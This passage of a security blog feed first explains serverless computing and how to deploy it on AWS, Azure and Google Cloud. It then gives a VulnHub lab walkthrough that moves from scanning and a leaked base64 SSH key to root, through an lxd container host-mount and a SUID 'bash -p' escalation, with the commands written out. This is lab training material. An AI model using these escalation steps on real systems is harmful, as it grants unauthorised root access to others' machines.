      &lt;li&gt;&lt;a href=&quot;#how-does-serverless-computing-works&quot; id=&quot;markdown-toc-how-does-serverless-computing-works&quot;&gt;How Does Serverless Computing Works?&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#things-serverless-computing-can-handle&quot; id=&quot;markdown-toc-things-serverless-computing-can-handle&quot;&gt;Things Serverless Computing can Handle&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sample-use-case-scenario-of-serverless-computing&quot; id=&quot;markdown-toc-sample-use-case-scenario-of-serverless-computing&quot;&gt;Sample Use-Case Scenario of Serverless Computing&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#benefits-of-serverless-computing&quot; id=&quot;markdown-toc-benefits-of-serverless-computing&quot;&gt;Benefits of Serverless Computing:&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#serverless-computing-using-aws-lambda&quot; id=&quot;markdown-toc-serverless-computing-using-aws-lambda&quot;&gt;Serverless Computing using AWS Lambda&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#serverless-computing-using-azure-functions&quot; id=&quot;markdown-toc-serverless-computing-using-azure-functions&quot;&gt;Serverless Computing using Azure Functions&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#serverless-computing-using-google-cloud-functions&quot; id=&quot;markdown-toc-serverless-computing-using-google-cloud-functions&quot;&gt;Serverless Computing using Google Cloud Functions&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#comparison&quot; id=&quot;markdown-toc-comparison&quot;&gt;Comparison&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#security-risks-in-serverless-computing&quot; id=&quot;markdown-toc-security-risks-in-serverless-computing&quot;&gt;Security Risks in Serverless Computing&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;what-is-serverless-&quot;&gt;What is serverless ?&lt;/h2&gt;
&lt;p&gt;Serverless is a cloud computing execution model where the cloud provider dynamically manages the allocation and provisioning of servers (Load balancing). A serverless application runs in stateless compute containers that are event-triggered and its completely managed by the cloud provider itself.&lt;/p&gt;

&lt;h3 id=&quot;popular-serverless-computing-providers&quot;&gt;Popular Serverless Computing Providers&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;AWS lambda&lt;/li&gt;
  &lt;li&gt;Azure functions&lt;/li&gt;
  &lt;li&gt;Google Cloud functions&lt;/li&gt;
  &lt;li&gt;IBM OpenWhisk&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;how-does-serverless-computing-works&quot;&gt;How Does Serverless Computing Works?&lt;/h3&gt;
&lt;p&gt;In a micro service architecture, monolithic applications are broken down into smaller services (F1,F2,F3) so you can develop, manage and scale them independently and FaaS (Function as a service) takes that step further by breaking applications to the level of functions and events.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/cloudsecurity/serverlesscomputing/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Business person just need to write the business logic as code ( F1,F2,F3), it is loaded into the container for execution when request from the client triggers a particular function. After the execution in the container ,response is generated and delivered back to the client.&lt;/p&gt;

&lt;h3 id=&quot;things-serverless-computing-can-handle&quot;&gt;Things Serverless Computing can Handle&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Load Balancing&lt;/li&gt;
  &lt;li&gt;Auto scaling&lt;/li&gt;
  &lt;li&gt;Handling Failures&lt;/li&gt;
  &lt;li&gt;Security Isolation&lt;/li&gt;
  &lt;li&gt;OS Management&lt;/li&gt;
  &lt;li&gt;Managing utilization&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;sample-use-case-scenario-of-serverless-computing&quot;&gt;Sample Use-Case Scenario of Serverless Computing&lt;/h2&gt;
&lt;p&gt;When an image is uploaded into a Cloud Storage Service (such as S3), a Serverless function could automatically resize the image for mobile, tablet, desktop devices. The event that triggers the function is the file that has been uploaded to cloud storage. Serverless function then executes the function of resizing the image.&lt;/p&gt;

&lt;h2 id=&quot;benefits-of-serverless-computing&quot;&gt;Benefits of Serverless Computing:&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Pay only when you use:&lt;/strong&gt;The user will be charged against the time that your functions were running (Paid according to no. of request received and Compute time) . Such architectures remove the need for the traditional ‘always on’ server system sitting behind an application, significantly reducing operational cost and complexity.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Easier Operational Management and Automatic Scaling:&lt;/strong&gt;Automatic scaling functionality of FaaS not only reduces computational cost but also reduces operational management overheads.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;Serverless Framework module:&lt;/strong&gt;The Serverless Framework consists of an open source CLI that makes it easy to develop, deploy and test serverless apps across different cloud providers, secure and monitor your serverless apps. This can be installed using the below command:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;npm &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; serverless
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;serverless-computing-using-aws-lambda&quot;&gt;Serverless Computing using AWS Lambda&lt;/h2&gt;
&lt;p class=&quot;lead&quot;&gt;Follow the below steps to deploy a simple serverless service using AWS Lambda&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Configure your CLI with the below command:
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;serverless config credentials - provider aws - key &lt;span class=&quot;s2&quot;&gt;&quot;YOUR ACCOUNT KEY&quot;&lt;/span&gt; - secret &lt;span class=&quot;s2&quot;&gt;&quot; YOUR SECRET KEY&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Create a project folder for serverless computing with needed template.
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;serverless create &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; aws-nodejs
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;It creates two files : &lt;strong&gt;handler.js&lt;/strong&gt; and &lt;strong&gt;serverless.yml&lt;/strong&gt;. &lt;strong&gt;serverless.yml&lt;/strong&gt; is like a configuration file for your handler file, &lt;strong&gt;handler.js&lt;/strong&gt; is like a function file where each function that are required are coded.&lt;/li&gt;
  &lt;li&gt;Uncomment the needed event part in the serverless.yml .Here i am using the http event part
&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/cloudsecurity/serverlesscomputing/3.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Run the command serverless deploy to deploy your instance.
&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/cloudsecurity/serverlesscomputing/4.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;serverless-computing-using-azure-functions&quot;&gt;Serverless Computing using Azure Functions&lt;/h2&gt;
&lt;p class=&quot;lead&quot;&gt;Microsoft Azure allows the users to develop and run the serverless functions both on Cloud and Local environment. 
Follow the below steps to deploy a simple serverless service using Azure Functions&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Run the following command from the command line to create a function app project. A github repository is also created with the same name.
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func init &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Folder_Name&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Select a worker runtime from the following language choices that will be prompted after creating the project:
    &lt;ul&gt;
      &lt;li&gt;.NET&lt;/li&gt;
      &lt;li&gt;Node JS&lt;/li&gt;
      &lt;li&gt;Powershell&lt;/li&gt;
      &lt;li&gt;Python&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Navigate to the created project folder.
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Folder_Name&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Create an HTTP-triggered function using the following command:
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func new &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Function_Name&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--template&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;HttpTrigger&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/cloudsecurity/serverlesscomputing/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;The following command starts the function app:
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;func start
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Navigate to URL displayed, append the query string &lt;em&gt;?name={yourname}&lt;/em&gt; to the URL and execute the request.
&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/cloudsecurity/serverlesscomputing/6.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;serverless-computing-using-google-cloud-functions&quot;&gt;Serverless Computing using Google Cloud Functions&lt;/h2&gt;
&lt;p&gt;Follow the below steps to deploy a simple serverless service using Google Cloud Functions&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Install serverless on your machine if not installed.
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;npm &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; serverless
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Create a project folder for serverless computing with needed template.
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;serverless create &lt;span class=&quot;nt&quot;&gt;--template&lt;/span&gt; google-nodejs &lt;span class=&quot;nt&quot;&gt;--path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Folder_Name&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;It creates three files: &lt;strong&gt;index.js&lt;/strong&gt;, &lt;strong&gt;package.json&lt;/strong&gt;, &lt;strong&gt;serverless.yml&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;Install all the dependencies
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;npm &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Create the credential key for your project on Google Cloud Console, download the key and update the key path on serverless.yml&lt;/li&gt;
  &lt;li&gt;Deploy the Serverless Instance
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;serverless deploy
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;comparison&quot;&gt;Comparison&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/cloudsecurity/serverlesscomputing/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;security-risks-in-serverless-computing&quot;&gt;Security Risks in Serverless Computing&lt;/h2&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Function Event-Data Injection&lt;/strong&gt;: Serverless functions can consume input form different types of event sources. Various parts of these event sources may contain user-controlled or untrusted inputs that should be carefully inspected.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Broken Authentication&lt;/strong&gt;: Applications may contain dozens or even hundreds of functions. Applying robust authentication can easily go awry if not executed carefully.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Serverless Business Logic Manipulation&lt;/strong&gt;: Serverless applications are unique as they often follow the micro-services design and contain numerous functions chained together to form overall logic. Without proper enforcement, attackers may be able to tamper with intended logic.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Insecure Application  Secrets Storage&lt;/strong&gt;: In Serverless application secrets such as Credentials, API Key etc. may be stored in a plain text configuration file that may be accessible to the end user and in some cases these credentials will be in plain text, as environment variables.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Improper Exception Handling and Verbose Error Messages&lt;/strong&gt;: Serverless computing provides line-by-line debugging options for applications. As a result, developers frequently adopt the use of verbose error messages, which may leak sensitive data.&lt;/li&gt;
&lt;/ol&gt;

&lt;p class=&quot;lead&quot;&gt;Happy Hacking!&lt;/p&gt;</content><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><category term="Blogs" /><category term="CloudSecurity" /><summary type="html">Most of the Serverless architecture are built with a motto of “Focus on the application, not the infrastructure and maintenance”</summary></entry><entry><title type="html">InfoSec Prep OSCP - Vuln Hub Machine</title><link href="http://localhost:4000/blogs/vulnhub/InfoSec_Prep_OSCP.html" rel="alternate" type="text/html" title="InfoSec Prep OSCP - Vuln Hub Machine" /><published>2020-08-05T00:00:00+05:30</published><updated>2020-08-05T00:00:00+05:30</updated><id>http://localhost:4000/blogs/vulnhub/InfoSec_Prep_OSCP</id><content type="html" xml:base="http://localhost:4000/blogs/vulnhub/InfoSec_Prep_OSCP.html">&lt;ul class=&quot;large-only&quot; id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#machine-summary&quot; id=&quot;markdown-toc-machine-summary&quot;&gt;Machine Summary&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#nmap-scan&quot; id=&quot;markdown-toc-nmap-scan&quot;&gt;Nmap Scan&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration-on-port-80&quot; id=&quot;markdown-toc-enumeration-on-port-80&quot;&gt;Enumeration on Port 80&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#acquiring-user-shell&quot; id=&quot;markdown-toc-acquiring-user-shell&quot;&gt;Acquiring User Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#privilege-escalation&quot; id=&quot;markdown-toc-privilege-escalation&quot;&gt;Privilege Escalation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#privilege-escalation-through-exploiting-lxd-group&quot; id=&quot;markdown-toc-privilege-escalation-through-exploiting-lxd-group&quot;&gt;Privilege Escalation through Exploiting lxd group&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#exploiting-the-misconfigured-suid---bash&quot; id=&quot;markdown-toc-exploiting-the-misconfigured-suid---bash&quot;&gt;Exploiting the misconfigured SUID - bash&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;machine-summary&quot;&gt;Machine Summary&lt;/h2&gt;
&lt;p&gt;Machine has a web application running, upon enumerating the directories /secret.txt contains a SSH Private key which is encoded in base64. After decryption, we can login as user &lt;strong&gt;oscp&lt;/strong&gt; with the SSH Private key. we can esclate the privileges to root in two ways 1. Exploiting the lxd group 2. Exploiting the SUID - Bash&lt;/p&gt;

&lt;h2 id=&quot;nmap-scan&quot;&gt;Nmap Scan&lt;/h2&gt;
&lt;p&gt;As the golden rule i started with nmap scan&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 192.168.0.101
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/1.png&quot; alt=&quot;&quot; /&gt;
It has two ports open&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Port&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Service&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;22&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ssh&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;http&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;33060&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;mysqlx&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;enumeration-on-port-80&quot;&gt;Enumeration on Port 80&lt;/h2&gt;

&lt;p&gt;I started to enumerate on the site, it was a wordpress site so i ran a wpscan on it but nothing poped up. I manually enumerated on the site but i ended up with no usefull information for enumeration
&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I ran gobuster on the site to enumerate the files and directories&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://192.168.0.101/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; php,html,txt,conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;secret.txt seems to be interesting, I opened it on the browser&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;acquiring-user-shell&quot;&gt;Acquiring User Shell&lt;/h2&gt;
&lt;p&gt;It was encoded on base64 so i decoded it, viewing that it was a SSH private key&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Base64_Hash&quot;&lt;/span&gt; |base64 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; id_rsa
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;We need some usernames to login through ssh using the private key so i tried guessing username and username &lt;strong&gt;&lt;em&gt;oscp&lt;/em&gt;&lt;/strong&gt; worked.
We also need to add permissions to the private key&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;600 id_rsa
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I logged in onto the machine using the private key for the user oscp&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa oscp@192.168.0.101
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;I enumerated the machine with current privilege as oscp, found two things that could grant us root shell&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;User is part of lxd group&lt;/li&gt;
  &lt;li&gt;Suid was configured for /usr/bin/bash&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;By these two ways, we can proceed to root.&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation-through-exploiting-lxd-group&quot;&gt;Privilege Escalation through Exploiting lxd group&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;LXC&lt;/strong&gt; —short for “Linux containers”, is a solution for virtualizing software at the operating system level within the Linux kernel.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;LXD&lt;/strong&gt; is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the  local lxd group.
ie. a low privilege user can create a bridge between sockets on the host and its containers. when bridging from an existing socket on the host to a new socket in a container, it makes the connection with the credentials of the LXD service. so when user speaks to the container, the messages (command) and it lands on the container with root privileges (commands are executed with the root)&lt;/p&gt;

&lt;p&gt;Executing lxc directly didn’t work so i tried executing it with the full path of the binary file ie. /snap/bin/lxc&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/snap/bin/lxc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;First i created a storage pool&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/snap/bin/lxd init
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I moved on with the default settings, now we need to create a container called test&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/snap/bin/lxc init ubuntu:18.04 &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; security.privileged&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;We configure that container such that all the files and folders of the host is copied or present in /mnt/root directory&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/snap/bin/lxc config device add &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;whatever disk &lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/ &lt;span class=&quot;nv&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/mnt/root &lt;span class=&quot;nv&quot;&gt;recursive&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Now we need to start the container called test&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/snap/bin/lxc start &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;We execute the container&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/snap/bin/lxc exec test bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we go into the directory &lt;strong&gt;/mnt/root/root&lt;/strong&gt; to get the flag.txt&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p class=&quot;note&quot; title=&quot;Attention&quot;&gt;&lt;strong&gt;This exploit methodolgy will only work when the target machine has access to internet&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;exploiting-the-misconfigured-suid---bash&quot;&gt;Exploiting the misconfigured SUID - bash&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;SUID&lt;/strong&gt; - SUID is nothing but a special permission bit available in Linux, that achieves this with a lot of ease. If you are the owner of an executable file, with the help of SUID permission set, other users will be running the executable with your  permission and not theirs.&lt;/p&gt;

&lt;p&gt;We can list the binaries with SUID permissions using the command below&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/9.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bash was the juicy binary. we can exploit it to get the root privilege&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://gtfobins.github.io/#+suid&quot;&gt;&lt;strong&gt;GTFOBins&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This granted us the shell with root privilege&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in//assets/img/blog/VulnHub/Infosec_Prep_OSCP/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

